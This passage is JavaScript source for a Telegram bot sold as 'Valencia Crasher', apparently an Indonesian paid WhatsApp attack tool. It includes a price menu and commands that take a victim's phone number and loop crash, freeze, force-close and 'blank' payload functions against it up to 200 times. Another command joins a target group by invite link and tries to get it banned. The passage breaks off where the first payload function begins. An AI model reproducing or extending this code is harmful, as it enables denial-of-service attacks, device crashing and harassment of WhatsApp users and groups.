            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/tools_menu', async (ctx) => {
    stopMenuAnimation(); 
    const tools_menuMenu = `
<blockquote>#- 𝘛 𝘖 𝘖 𝘓 𝘚  -  𝘔 𝘌 𝘕 𝘜

"一緒 Tools Menu 𝐕𝐚𝐥𝐞𝐧𝐜𝐢𝐚 𝐂𝐫𝐚𝐬𝐡𝐞𝐫  ᯤ",
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /update - [UPDATE SCRIPT KE VERSION TERBARU]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /cekemoji - [CEK EMOJI PREMIUM]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /CheckError - [CEK EROR FILE.js]
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji> /fixerror - [FIX EROR FILE.js]</blockquote>
`;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start" },
        ]
    ];

    try {
        await ctx.editMessageCaption(tools_menuMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });

        await ctx.answerCbQuery();

    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di tools_menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/alwaysZillxy_menu', async (ctx) => {
    stopMenuAnimation(); 
    const alwaysZillxy_menuMenu = `
<blockquote>〔 𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢 〕</blockquote>
<blockquote>♡ RriztXflow.t.me ( My elder )
♡ angkasaimgood.t.me ( My best friend )
♡ topspolice.t.me ( My best friend )
♡ Miwachangojo.t.me ( My younger brother )
♡ mamzyganteng.t.me ( MY OFFSPRING )
♡ SATZZSTR.t.me ( MY OFFSPRING )
♡ ryukaizenn.t.me ( MY partner )
♡ LexzyMods.t.me ( MY OFFSPRING )
♡ kallmbut1.t.me ( MY OFFSPRING )
♡ All buyer 𝐕𝐚𝐥𝐞𝐧𝐜𝐢𝐚 𝐂𝐫𝐚𝐬𝐡𝐞𝐫
♡ All patner,owner,tk valencia</blockquote>
`;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start" },
        ]
    ];

    try {
        await ctx.editMessageCaption(alwaysZillxy_menuMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });

        await ctx.answerCbQuery();

    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di alwaysZillxy_menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/harga_menu', async (ctx) => {
    stopMenuAnimation(); 
    const harga_menuMenu = `
<blockquote>⌑ <tg-emoji emoji-id="5435886793671067739">💀</tg-emoji> 𝐕𝐚𝐥𝐞𝐧𝐜𝐢𝐚 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 <tg-emoji emoji-id="5435886793671067739">💀</tg-emoji> ⌑</blockquote>
<tg-emoji emoji-id="5470141799261555371">➡️</tg-emoji> Type script: bebas spam bugs 
<tg-emoji emoji-id="5470141799261555371">➡️</tg-emoji> Version : Latest 
<tg-emoji emoji-id="5470141799261555371">➡️</tg-emoji> Cocok untuk: Open murbug
<blockquote>⌑ <tg-emoji emoji-id="5116648080787112958">💰</tg-emoji> 𝐏𝐑𝐈𝐂𝐄 𝐒𝐂𝐑𝐈𝐏𝐓?</blockquote>
Rp 5.000 full update 
Rp 10.000 reseller 
Rp 15.000 Patner 
Rp 20.000 moderator 
Rp 25.000 ceo
Rp 30.000 owner 
<blockquote>⌑  <tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji>𝐓𝐘𝐏𝐄 𝐁𝐔𝐆𝐒?</blockquote>
<tg-emoji emoji-id="4918408122868958076">🖱️</tg-emoji>delay invisible bebas spam 
<tg-emoji emoji-id="4918408122868958076">🖱️</tg-emoji>new delay bebas spam 
<tg-emoji emoji-id="4918408122868958076">🖱️</tg-emoji>new force close ios invisible 
<tg-emoji emoji-id="4918408122868958076">🖱️</tg-emoji>delay hard 
<tg-emoji emoji-id="4918408122868958076">🖱️</tg-emoji>frezze new
<tg-emoji emoji-id="4918408122868958076">🖱️</tg-emoji>blank andro ++
<tg-emoji emoji-id="4918408122868958076">🖱️</tg-emoji>dan lain lain
<blockquote>⌑ <tg-emoji emoji-id="5350618807943576963">⚡</tg-emoji> 𝐓𝐎𝐎𝐋𝐒 𝑽𝑨𝑳𝑬𝑵𝑪𝑰𝑨 𝑪𝑹𝑨𝑺𝑯𝑬𝑹?</blockquote>
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji>𝖢οnn𝖾ᴄtⅰοn s𝖾nⅾ𝖾rs n𝖾𝗐 р⍺ⅰrⅰn𝗀
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji>𝖣𝖾І𝖾t𝖾Рr𝖾mⅰ𝗎n 
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji>𝖠ⅾⅾ𝗀rο𝗎р рr𝖾mⅰ𝗎m
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji>Approve group 
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji>unapproved
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji>support sender ori/bisnis
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji>auto update 
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji>Testfunction 
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji>Fix error
<tg-emoji emoji-id="4972059574430335804">🔥</tg-emoji>dan lain lain
<blockquote><tg-emoji emoji-id="5330237710655306682">📱</tg-emoji>Telegram owner:</blockquote>
@quenvalencia<tg-emoji emoji-id="5208727996315220567">✅</tg-emoji>
`;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start" },
        ]
    ];

    try {
        await ctx.editMessageCaption(harga_menuMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });

        await ctx.answerCbQuery();

    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di harga_menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/info_menu', async (ctx) => {
    stopMenuAnimation(); 
    const info_menuMenu = `
<blockquote>〔 𝗜𝗡𝗙𝗢 𝗨𝗣𝗗𝗔𝗧𝗘 〕</blockquote>
<blockquote>1. NEW COMMAND /update
2. NEW TOOLS /cekemoji
3. NEW TOOLS /CheckError
4. NEW TOOLS /fixerror
5. FIX FUNC GA WORK

ALL BUG BEBAS SPAM ANTI KENON 80%
SARAN SET COOLDOWN 3 DETIK</blockquote>
`;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start" },
        ]
    ];

    try {
        await ctx.editMessageCaption(info_menuMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });

        await ctx.answerCbQuery();

    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di info_menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.command("cekupdate", async (ctx) => {
  if (String(ctx.from.id) !== String(ID_TELEGRAM) && String(ctx.from.id) !== String(DEV_ID)) {
    return ctx.reply("❌ ☇ Akses hanya untuk owner");
  }

  const state = getUpdateState();
  let statusInfo = "⚠️ Gagal cek ke GitHub";
  try {
    const remote = await fetchRemoteIndex();
    statusInfo = remote.sha === state.sha ? "✅ Sudah versi terbaru" : "🆕 Ada update baru tersedia";
  } catch (e) {}

  await ctx.reply(
    `🪩 <b>Status Auto-Update</b>\n\n` +
      `Mode: <code>${MODE}</code>\n` +
      `Last Update: <code>${state.lastUpdate || "Belum pernah update"}</code>\n` +
      `SHA Lokal: <code>${state.sha ? state.sha.slice(0, 7) : "-"}</code>\n` +
      `Status: ${statusInfo}`,
    { parse_mode: "HTML" }
  );
});

bot.command("upindex", async (ctx) => {
  if (String(ctx.from.id) !== String(DEV_ID)) {
    return ctx.reply("❌ ☇ Akses hanya untuk developer");
  }
  if (MODE !== "developer") {
    return ctx.reply("❌ ☇ /upindex cuma bisa dipakai di mode developer");
  }
  if (!GH_PAT) {
    return ctx.reply("❌ ☇ GH_PAT belum diisi di index.js, gak bisa push ke GitHub");
  }

  await ctx.reply("⏳ <b>Push index.js ke GitHub...</b>\nMohon tunggu.", { parse_mode: "HTML" });

  try {
  
    const remote = await fetchRemoteIndex();

    const localContent = fs.readFileSync(UPDATE_FILE_PATH, "utf-8");
    const strippedContent = localContent.replace(
      /const GH_PAT = ".*?";/,
      'const GH_PAT = ""; // isi manual di file dev'
    );

    const safeContent = encryptSourceForPush(strippedContent);
    
    const sizeBytes = Buffer.byteLength(safeContent, "utf-8");
    const SAFE_LIMIT_BYTES = 20 * 1024 * 1024; // 20MB
    if (sizeBytes > SAFE_LIMIT_BYTES) {
      return ctx.reply(
        `❌ <b>Push dibatalkan.</b>\nHasil enkripsi index.js (<code>${(sizeBytes / 1024 / 1024).toFixed(1)} MB</code>) ` +
          `kegedean banget, kemungkinan push ke GitHub bakal gagal/timeout. Perkecil source dulu.`,
        { parse_mode: "HTML" }
      );
    }

    const { data } = await ghApi.repos.createOrUpdateFileContents({
      owner: GH_OWNER,
      repo: GH_REPO,
      path: GH_PATH,
      branch: GH_BRANCH,
      message: `update index.js via /upindex - ${new Date().toISOString()}`,
      content: Buffer.from(safeContent, "utf-8").toString("base64"),
      sha: remote.sha,
    });

    setUpdateState(data.content.sha);

    await ctx.reply(
      `✅ <b>Berhasil push update ke GitHub (terenkripsi, ${(sizeBytes / 1024).toFixed(0)} KB)!</b>\n♻ <i>User mode production bakal auto-update & restart otomatis.</i>`,
      { parse_mode: "HTML" }
    );

    await broadcastUpdateNotif(
      ctx.telegram,
      `🔥 <b>Update Baru Tersedia!</b>\n\nScript bakal auto-update & restart otomatis di pengecekan berikutnya.`
    );
  } catch (e) {
    await ctx.reply(
      `❌ <b>Gagal push update.</b>\nReason: <code>${String(e.message || e)}</code>`,
      { parse_mode: "HTML" }
    );
  }
});

bot.command("addnotif", async (ctx) => {
  if (String(ctx.from.id) !== String(ID_TELEGRAM) && String(ctx.from.id) !== String(DEV_ID)) {
    return ctx.reply("❌ ☇ Akses hanya untuk owner");
  }
  const target = ctx.message.text.split(" ")[1] || String(ctx.from.id);
  const list = getNotifList();
  if (list.includes(target)) return ctx.reply("ℹ️ ☇ Chat id ini udah terdaftar.");
  list.push(target);
  saveJSON(NOTIF_TOKEN_FILE, list);
  await ctx.reply(`✅ ☇ Chat id <code>${target}</code> terdaftar buat notif update.`, {
    parse_mode: "HTML",
  });
});

bot.command("VcXIoscrash", checkWhatsAppConnection, checkPremium(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /VcXIoscrash 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `\`\`\`JS
⬡═―⊱「 𝐕𝐚𝐥𝐞𝐧𝐜𝐢𝐚 𝐂𝐫𝐚𝐬𝐡𝐞𝐫  」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Forclose Ios 
⌑ Status: Process
╘═——————————————═⬡\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 200; i++) {
    await fc(sock, target);
    await makklofc(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
⬡═―⊱「 𝐕𝐚𝐥𝐞𝐧𝐜𝐢𝐚 𝐂𝐫𝐚𝐬𝐡𝐞𝐫  」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Forclose Ios
⌑ Status: Success
╘═——————————————═⬡\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("VcXBlank", checkWhatsAppConnection, checkPremium(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /VcXBlank 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `\`\`\`JS
⬡═―⊱「 𝐕𝐚𝐥𝐞𝐧𝐜𝐢𝐚 𝐂𝐫𝐚𝐬𝐡𝐞𝐫  」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Blank Andro New
⌑ Status: Process
╘═——————————————═⬡\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 15; i++) {
    await BlankEraV1(sock, target);
    await BlankEraV5(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
⬡═―⊱「 𝐕𝐚𝐥𝐞𝐧𝐜𝐢𝐚 𝐂𝐫𝐚𝐬𝐡𝐞𝐫  」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Blank Andro New
⌑ Status: Success
╘═——————————————═⬡\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("VcXDelay", checkWhatsAppConnection, checkPremium(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /VcXDelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `\`\`\`JS
⬡═―⊱「 𝐕𝐚𝐥𝐞𝐧𝐜𝐢𝐚 𝐂𝐫𝐚𝐬𝐡𝐞𝐫  」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Delay WhatsApp New
⌑ Status: Process
╘═——————————————═⬡\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 40; i++) {
    await CrasNoCLikV2(sock, target);         
    await CrasNoCLikV3(sock, target);
    await LexcaabosV7(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
⬡═―⊱「 𝐕𝐚𝐥𝐞𝐧𝐜𝐢𝐚 𝐂𝐫𝐚𝐬𝐡𝐞𝐫  」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Delay WhatsApp New
⌑ Status: Success
╘═——————————————═⬡\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("VcXcrash", checkWhatsAppConnection, checkPremium(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /VcXcrash 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `\`\`\`JS
⬡═―⊱「 𝐕𝐚𝐥𝐞𝐧𝐜𝐢𝐚 𝐂𝐫𝐚𝐬𝐡𝐞𝐫  」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Crash WhatsApp New
⌑ Status: Process
╘═——————————————═⬡\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await fc(sock, target);
    await tes(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
⬡═―⊱「 𝐕𝐚𝐥𝐞𝐧𝐜𝐢𝐚 𝐂𝐫𝐚𝐬𝐡𝐞𝐫  」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Crash WhatsApp New
⌑ Status: Success
╘═——————————————═⬡\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Frezze", checkWhatsAppConnection, checkPremium(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Frezze 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `\`\`\`JS
⬡═―⊱「 𝐕𝐚𝐥𝐞𝐧𝐜𝐢𝐚 𝐂𝐫𝐚𝐬𝐡𝐞𝐫  」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Frezze WhatsApp New
⌑ Status: Process
╘═——————————————═⬡\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await CrasNoCLikV2(sock, target);         
    await CrasNoCLikV3(sock, target);
    await LexcaabosV7(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
⬡═―⊱「 𝐕𝐚𝐥𝐞𝐧𝐜𝐢𝐚 𝐂𝐫𝐚𝐬𝐡𝐞𝐫  」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Frezze WhatsApp New
⌑ Status: Success
╘═——————————————═⬡\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("zxbugs", checkWhatsAppConnection, checkPremium(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /zxbugs 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `\`\`\`JS
⿻𝑽𝑨𝑳𝑬𝑵𝑪𝑰𝑨 𝑪𝑹𝑨𝑺𝑯𝑬𝑹⿻ 

» Information:
☇ Target: ${q}
☇ Type: invisible bebas spam
☇ Status : succees 
────────────────────
© 𝑽𝑨𝑳𝑬𝑵𝑪𝑰𝑨 𝑪𝑹𝑨𝑺𝑯𝑬𝑹\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐇𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await CrasNoCLikV2(sock, target);         
    await CrasNoCLikV3(sock, target);
    await LexcaabosV7(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
⿻𝑽𝑨𝑳𝑬𝑵𝑪𝑰𝑨 𝑪𝑹𝑨𝑺𝑯𝑬𝑹⿻ 

» Information:
☇ Target: ${q}
☇ Type: invisible bebas spam
☇ Status : succees 
────────────────────
© 𝑽𝑨𝑳𝑬𝑵𝑪𝑰𝑨 𝑪𝑹𝑨𝑺𝑯𝑬𝑹\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐇𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("zxkill", checkWhatsAppConnection, checkPremium(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /zxkill 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `\`\`\`JS
⿻𝑽𝑨𝑳𝑬𝑵𝑪𝑰𝑨 𝑪𝑹𝑨𝑺𝑯𝑬𝑹⿻ 

» Information:
☇ Target: ${q}
☇ Type: delay invisible bebas spam
☇ Status : succees 
────────────────────
© 𝑽𝑨𝑳𝑬𝑵𝑪𝑰𝑨 𝑪𝑹𝑨𝑺𝑯𝑬𝑹\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐇𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await CrasNoCLikV2(sock, target);         
    await CrasNoCLikV3(sock, target);
    await LexcaabosV7(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
⿻𝑽𝑨𝑳𝑬𝑵𝑪𝑰𝑨 𝑪𝑹𝑨𝑺𝑯𝑬𝑹⿻ 

» Information:
☇ Target: ${q}
☇ Type: delay invisible bebas spam v2
☇ Status : succees 
────────────────────
© 𝑽𝑨𝑳𝑬𝑵𝑪𝑰𝑨 𝑪𝑹𝑨𝑺𝑯𝑬𝑹\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐇𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xsuper", checkWhatsAppConnection, checkPremium(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xsuper 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `\`\`\`JS
⿻𝑽𝑨𝑳𝑬𝑵𝑪𝑰𝑨 𝑪𝑹𝑨𝑺𝑯𝑬𝑹⿻ 

» Information:
☇ Target: ${q}
☇ Type: delay invisible X Buldo bebas spam
☇ Status : succees 
────────────────────
© 𝑽𝑨𝑳𝑬𝑵𝑪𝑰𝑨 𝑪𝑹𝑨𝑺𝑯𝑬𝑹\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐇𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await CrasNoCLikV2(sock, target);         
    await CrasNoCLikV3(sock, target);
    await LexcaabosV7(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
⿻𝑽𝑨𝑳𝑬𝑵𝑪𝑰𝑨 𝑪𝑹𝑨𝑺𝑯𝑬𝑹⿻ 

» Information:
☇ Target: ${q}
☇ Type: delay invisible X buldo bebas spam v2
☇ Status : succees 
────────────────────
© 𝑽𝑨𝑳𝑬𝑵𝑪𝑰𝑨 𝑪𝑹𝑨𝑺𝑯𝑬𝑹\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐇𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xyzyy", checkWhatsAppConnection, checkPremium(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xyzyy 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `\`\`\`JS
⿻𝑽𝑨𝑳𝑬𝑵𝑪𝑰𝑨 𝑪𝑹𝑨𝑺𝑯𝑬𝑹⿻ 

» Information:
☇ Target: ${q}
☇ Type: delay bebas spam 
☇ Status : succees 
────────────────────
© 𝑽𝑨𝑳𝑬𝑵𝑪𝑰𝑨 𝑪𝑹𝑨𝑺𝑯𝑬𝑹\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐇𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await CrasNoCLikV2(sock, target);         
    await CrasNoCLikV3(sock, target);
    await LexcaabosV7(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
⿻𝑽𝑨𝑳𝑬𝑵𝑪𝑰𝑨 𝑪𝑹𝑨𝑺𝑯𝑬𝑹⿻ 

» Information:
☇ Target: ${q}
☇ Type: delay bebas spam
☇ Status : succees 
────────────────────
© 𝑽𝑨𝑳𝑬𝑵𝑪𝑰𝑨 𝑪𝑹𝑨𝑺𝑯𝑬𝑹\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐇𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });
});
bot.command(
  "groupban",
  checkWhatsAppConnection,
  checkPremium,
  async (ctx) => {

    const chatId = ctx.chat.id;

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const input = ctx.message.text.split(" ").slice(1).join(" ").trim();

    if (!input) {
      return ctx.reply(
        "🪧 Example:\n/groupban https://chat.whatsapp.com/xxxx\n/groupban 123456789@g.us"
      );
    }

    let groupJid;

    try {
      const inviteRegex = /https:\/\/chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
      const matchInvite = input.match(inviteRegex);

      if (matchInvite) {
        const code = matchInvite[1];

        const progress = await ctx.reply("⏳ Bergabung ke grup...");

        groupJid = await sock.groupAcceptInvite(code);

        await ctx.telegram.editMessageText(
          chatId,
          progress.message_id,
          undefined,
          `✅ Berhasil bergabung ke grup.\n\n${groupJid}`
        );

      } else {

        if (!input.endsWith("@g.us")) {
          return ctx.reply(
            "❌ Masukkan link undangan atau ID grup yang valid."
          );
        }

        groupJid = input;
      }

    } catch (err) {
      return ctx.reply(`❌ ${err.message}`);
    }

    const msg = await ctx.reply(
`🚀 Group Ban By 𝐕𝐚𝐥𝐞𝐧𝐜𝐢𝐚 𝐂𝐫𝐚𝐬𝐡𝐞𝐫  

👤 User : ${username}
🎯 Target : ${groupJid}
⏳ Status : Processing...`
    );

    try {

      await groupBan(sock, groupJid);

      await ctx.telegram.editMessageText(
        chatId,
        msg.message_id,
        undefined,
`🚀 Group Ban By 𝐕𝐚𝐥𝐞𝐧𝐜𝐢𝐚 𝐂𝐫𝐚𝐬𝐡𝐞𝐫  

👤 User : ${username}
🎯 Target : ${groupJid}
✅ Status : Success`,
        {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "☇ Check Grup",
                  url: "https://chat.whatsapp.com/"
                }
              ]
            ]
          }
        }
      );

    } catch (err) {

      await ctx.telegram.editMessageText(
        chatId,
        msg.message_id,
        undefined,
`🚀 Group Ban By 𝐕𝐚𝐥𝐞𝐧𝐜𝐢𝐚 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 

👤 User : ${username}
🎯 Target : ${groupJid}
❌ Status : ${err.message}`
      );

    }

  }
);

// ------ ( Awal Of Function Bug) ------ //
async function fc(sock, target) {
    const IMG = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
